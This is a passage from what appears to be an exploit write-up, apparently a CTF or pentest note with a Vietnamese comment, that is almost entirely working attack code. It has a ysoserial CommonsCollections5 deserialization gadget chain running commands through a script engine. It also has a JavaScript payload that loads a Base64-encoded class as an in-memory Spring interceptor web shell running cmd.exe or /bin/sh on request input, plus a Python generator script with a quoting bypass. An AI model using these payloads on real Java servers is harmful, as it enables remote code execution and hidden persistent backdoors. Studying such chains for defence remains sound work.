                    new Class[] {Object[].class},
                    new Object[] {new Object[0]}),
                new InvokerTransformer("getEngineByName",
                    new Class[] { String.class},
                    new Object[]{ "js"}),
                new InvokerTransformer("eval",
                    new Class[] {String.class},
                    new Object[] {command})};
    
    		final Map innerMap = new HashMap();
    
    		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    
    		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
    
    		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
    		Field valfield = val.getClass().getDeclaredField("val");
            Reflections.setAccessible(valfield);
    		valfield.set(val, entry);
    
    		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
    
    		return val;
    	}
    
    	public static void main(final String[] args) throws Exception {
    		PayloadRunner.run(CommonsCollections5.class, args);
    	}
    
        public static boolean isApplicableJavaVersion() {
            return JavaVersion.isBadAttrValExcReadObj();
        }
    
    }
    
    ```

  - Payload script engine 

    ```javascript
    var context = org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
    
    var abstractHandlerMapping = context.getBean("requestMappingHandlerMapping");
    
    var field_1 = Java.type("java.lang.reflect.Field");
    
    field_1 = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
    
    field_1.setAccessible(true);
    
    var adaptedInterceptors = field_1.get(abstractHandlerMapping);
    
    var classname = "com.memshell.blablaInterceptor";
    
    var b64 = "yv66vgAAADIAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vbWVtc2hlbGwvYmxhYmxhSW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEY29kZQEADVN0YWNrTWFwVGFibGUHAFMHAGkHAFIHAFkHAGcHAGoHAGsHAGwHAGYBAApFeGNlcHRpb25zAQAKU291cmNlRmlsZQEAFmJsYWJsYUludGVyY2VwdG9yLmphdmEMACEAIgcAagwAbQBuBwBrDABvAHABAAABAAdvcy5uYW1lBwBxDAByAG4MAHMAdAEAA3dpbgwAdQB2AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIQB3AQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHgAeQcAegwAewB8DAAhAH0BAAJcQQwAfgB/DACAAIEMAIIAdAwAgwAiBwBpDACEAIUMAIYAIgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAB5jb20vbWVtc2hlbGwvYmxhYmxhSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAACAAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAALAAoADAAPAA4AFwAPABsAEQArABIASgAUAGYAFgB8ABcAkAAYAJUAGQCcABoAoQAbAKYAHQCpABwAqwAeAK0AIAAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF";
    
    var base64 = Java.type("sun.misc.BASE64Decoder");
    
    var content_file = base64.class.newInstance().decodeBuffer(b64);
    
    var class_loader = java.lang.Thread.currentThread().getContextClassLoader();
    
    var method = java.lang.reflect.Method;
    
    var ByteArray = Java.type("byte[]");
    
    method = java.lang.ClassLoader.class.getDeclaredMethod("defineClass",java.lang.String.class, ByteArray.class, java.lang.Integer.TYPE , java.lang.Integer.TYPE);
    
    method.setAccessible(true);
    
    method.invoke(class_loader,classname,content_file,0,content_file.length);
    
    adaptedInterceptors.add(class_loader.loadClass("com.memshell.blablaInterceptor").newInstance());
    ```

    ```python
    #genpayload.py
    import os
    import base64
    import subprocess
    
    def run_command(cmd):
        """given shell command, returns communication tuple of stdout and stderr"""
        # instantiate a startupinfo obj:
        startupinfo = subprocess.STARTUPINFO()
        # set the use show window flag, might make conditional on being in Windows:
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        # pass as the startupinfo keyword argument:
        return subprocess.Popen(cmd,
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, 
                                stdin=subprocess.PIPE, 
                                startupinfo=startupinfo).communicate()
    
    
    payload = 'var context = org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes().getAttribute(""org.springframework.web.servlet.DispatcherServlet.CONTEXT"", 0); var abstractHandlerMapping = context.getBean(""requestMappingHandlerMapping""); var field_1 = Java.type(""java.lang.reflect.Field""); field_1 = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(""adaptedInterceptors""); field_1.setAccessible(true); var adaptedInterceptors = field_1.get(abstractHandlerMapping); var classname = ""com.memshell.blablaInterceptor""; var b64 = ""yv66vgAAADIAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vbWVtc2hlbGwvYmxhYmxhSW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEY29kZQEADVN0YWNrTWFwVGFibGUHAFMHAGkHAFIHAFkHAGcHAGoHAGsHAGwHAGYBAApFeGNlcHRpb25zAQAKU291cmNlRmlsZQEAFmJsYWJsYUludGVyY2VwdG9yLmphdmEMACEAIgcAagwAbQBuBwBrDABvAHABAAABAAdvcy5uYW1lBwBxDAByAG4MAHMAdAEAA3dpbgwAdQB2AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIQB3AQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHgAeQcAegwAewB8DAAhAH0BAAJcQQwAfgB/DACAAIEMAIIAdAwAgwAiBwBpDACEAIUMAIYAIgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAB5jb20vbWVtc2hlbGwvYmxhYmxhSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAACAAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAALAAoADAAPAA4AFwAPABsAEQArABIASgAUAGYAFgB8ABcAkAAYAJUAGQCcABoAoQAbAKYAHQCpABwAqwAeAK0AIAAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF""; var base64 = Java.type(""sun.misc.BASE64Decoder""); var content_file = base64.class.newInstance().decodeBuffer(b64); var class_loader = java.lang.Thread.currentThread().getContextClassLoader(); var method = java.lang.reflect.Method; var ByteArray = Java.type(""byte[]""); method = java.lang.ClassLoader.class.getDeclaredMethod(""defineClass"",java.lang.String.class, ByteArray.class, java.lang.Integer.TYPE , java.lang.Integer.TYPE); method.setAccessible(true); method.invoke(class_loader,classname,content_file,0,content_file.length); adaptedInterceptors.add(class_loader.loadClass(""com.memshell.blablaInterceptor"").newInstance());'
    
    content = run_command("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 " + "\"" + payload + "\"")
    
    print(base64.b64encode(content[0]).decode())
    
    
    
    
    # Note là khi payload deserialize, script engine sẽ tự strip dấu " hoặc ' => như vậy ta phải thêm "" hoặc '' để bypass chỗ này.
    ```

